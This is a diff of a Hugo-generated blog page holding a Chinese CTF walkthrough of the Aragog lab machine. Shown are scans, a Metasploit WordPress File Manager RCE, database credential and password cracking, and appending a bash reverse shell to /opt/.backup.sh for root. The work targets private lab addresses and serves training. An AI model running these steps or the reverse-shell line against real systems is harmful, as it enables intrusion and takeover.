@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -285,9 +285,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -sP 192.168.150.1/24
-nmap --min-rate<span class="o">=</span><span class="m">10000</span> -T4 -sC -A 192.168.150.135
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sP 192.168.150.1/24
+</span></span><span class="line"><span class="cl">nmap --min-rate<span class="o">=</span><span class="m">10000</span> -T4 -sC -A 192.168.150.135
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果</p>
 <pre tabindex="0"><code>PORT   STATE SERVICE VERSION
@@ -298,7 +298,7 @@ nmap --min-rate<span class="o">=</span><span class="m">10000</span> -T4 -sC -A 1
 |_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
 |_http-server-header: Apache/2.4.38 (Debian)
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&#39;t have a title (text/html).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre><p>ssh爆破失败，那就从正常服务入手。</p>
 <h2 id="渗透过程"><a href="#渗透过程" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:渗透过程" class="headings">渗透过程</a></h2>
@@ -309,8 +309,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">dirb http://192.168.150.135
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirb http://192.168.150.135
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果发现是一个使用wordpress的博客站点，上wpscan扫描插件漏洞</p>
 <div class="highlight"><div class="chroma">
@@ -318,8 +318,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wpscan --url<span class="o">=</span>http://192.168.150.135/blog --enumerate<span class="o">=</span>vp
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url<span class="o">=</span>http://192.168.150.135/blog --enumerate<span class="o">=</span>vp
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫不粗来，需要api-token。。。懒得注册了，直接<a href="https://www.0x1ceb00da.net/harry-potter-aragog/" target="_blank" rel="noopener">wp</a>得到漏洞信息</p>
 <pre tabindex="0"><code> | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
@@ -342,18 +342,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">use exploit/multi/http/wp_file_manager_rce
-<span class="nb">set</span> RHOST 192.168.150.135
-<span class="nb">set</span> TARGETURI /blog
-<span class="nb">set</span> LHOST 192.168.150.128
-run
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/multi/http/wp_file_manager_rce
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOST 192.168.150.135
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> TARGETURI /blog
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST 192.168.150.128
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>成功获得shell。</p>
 <h3 id="horcrux1txt"><a href="#horcrux1txt" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:horcrux1txt" class="headings">horcrux1.txt</a></h3>
 <p>在<code>/home/hagrid98</code>下获得第一个flag：</p>
 <pre tabindex="0"><code>horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
-# horcrux_{1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets}
+# horcrux_{1: RidDlE&#39;s DiAry dEstroYed By haRry in chaMbEr of SeCrets}
 </code></pre><h3 id="horcrux2txt"><a href="#horcrux2txt" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:horcrux2txt" class="headings">horcrux2.txt</a></h3>
 <p>没啥办法，继续收集信息吧，在<code>/etc/wordpress</code>获得配置信息</p>
 <p><code>config-default.php</code></p>
@@ -369,15 +369,15 @@ run
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;wordpress&#39;</span><span class="p">);</span>
-<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
-<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;mySecr3tPass&#39;</span><span class="p">);</span>
-<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
-<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8_general_ci&#39;</span><span class="p">);</span>
-<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;WP_CONTENT_DIR&#39;</span><span class="p">,</span> <span class="s1">&#39;/usr/share/wordpress/wp-content&#39;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;wordpress&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;mySecr3tPass&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8_general_ci&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;WP_CONTENT_DIR&#39;</span><span class="p">,</span> <span class="s1">&#39;/usr/share/wordpress/wp-content&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>meterpreter使用shell命令获得www-data权限的shell，然后执行<code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code>生成交互连接数据库</p>
 <div class="highlight"><div class="chroma">
@@ -385,8 +385,8 @@ run
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mysql -uroot -pmySecr3tPass
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -uroot -pmySecr3tPass
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>在<code>wp_users</code>表中找到用户信息</p>
 <pre tabindex="0"><code>hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local
@@ -394,12 +394,12 @@ run
 <pre tabindex="0"><code>wpscan --url http://192.168.150.135/blog --passwords /usr/share/wordlists/fasttrack.txt --usernames hagrid98
 </code></pre><p>结果：<code>Username: hagrid98, Password: password123</code>，然后执行<code>su hagrid98 </code>登录用户。这样我们就有权限来读取用户目录下的<code>.viminfo</code>文件来了解vim操作的内容</p>
 <pre tabindex="0"><code># This viminfo file was generated by Vim 8.1.
-# You may edit it if you're careful!
+# You may edit it if you&#39;re careful!
 
 # Viminfo version
 |1,4
 
-# Value of 'encoding' when this file was written
+# Value of &#39;encoding&#39; when this file was written
 *encoding=utf-8
 
 
@@ -407,7 +407,7 @@ run
 ~h
 # Command Line History (newest to oldest):
 :wq
-|2,0,1617287649,,&quot;wq&quot;
+|2,0,1617287649,,&#34;wq&#34;
 
 # Search String History (newest to oldest):
 
@@ -418,45 +418,45 @@ run
 # Debug Line History (newest to oldest):
 
 # Registers:
-&quot;&quot;1     LINE    0
+&#34;&#34;1     LINE    0
         cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads 
-|3,1,1,1,1,0,1617287646,&quot;cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads &quot;
-&quot;2      LINE    0
+|3,1,1,1,1,0,1617287646,&#34;cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads &#34;
+&#34;2      LINE    0
 
-|3,0,2,1,1,0,1617287645,&quot;&quot;
-&quot;3      LINE    0
+|3,0,2,1,1,0,1617287645,&#34;&#34;
+&#34;3      LINE    0
         #!/bin/bash
-|3,0,3,1,1,0,1617287645,&quot;#!/bin/bash&quot;
+|3,0,3,1,1,0,1617287645,&#34;#!/bin/bash&#34;
 
 # File marks:
-'0  3  20  /opt/.backup.sh
-|4,48,3,20,1617287649,&quot;/opt/.backup.sh&quot;
+&#39;0  3  20  /opt/.backup.sh
+|4,48,3,20,1617287649,&#34;/opt/.backup.sh&#34;
 
 # Jumplist (newest first):
--'  3  20  /opt/.backup.sh
-|4,39,3,20,1617287649,&quot;/opt/.backup.sh&quot;
--'  1  0  /opt/.backup.sh
-|4,39,1,0,1617287621,&quot;/opt/.backup.sh&quot;
+-&#39;  3  20  /opt/.backup.sh
+|4,39,3,20,1617287649,&#34;/opt/.backup.sh&#34;
+-&#39;  1  0  /opt/.backup.sh
+|4,39,1,0,1617287621,&#34;/opt/.backup.sh&#34;
 
 # History of marks within files (newest to oldest):
 
 &gt; /opt/.backup.sh
         *       1617287648      0
-        &quot;       3       20
+        &#34;       3       20
         ^       3       21
         .       3       20
         +       1       11
         +       3       20
 </code></pre><p>可以看到这里对文件<code>/opt/.backup.sh</code>做出过修改，既然之前能写入文件，那么我们肯定也有权限对其作出修改，简简单单弹个shell</p>
-<pre tabindex="0"><code>echo &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.150.128/5555 0&gt;&amp;1'&quot; &gt;&gt; /opt/.backup.sh
+<pre tabindex="0"><code>echo &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.150.128/5555 0&gt;&amp;1&#39;&#34; &gt;&gt; /opt/.backup.sh
 </code></pre><p>接下来就出现了一个问题，如果直接执行脚本，那不还是这个用户吗？那有什么意义呢？我们可以看脚本内容</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>将文件备份到tmp下，现在去检查备份目录的权限</p>
 <pre tabindex="0"><code>drwxr-xr-x 5 root root 4096 May 14 19:08 tmp_wp_uploads
@@ -464,7 +464,7 @@ run
 <p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210515000753.png" alt=""></p>
 <p>获得flag2</p>
 <pre tabindex="0"><code>horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
-# horcrux_{2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre}
+# horcrux_{2: maRvoLo GaUnt&#39;s riNg deStrOyed bY DUmbledOre}
 </code></pre>
             </div>
 
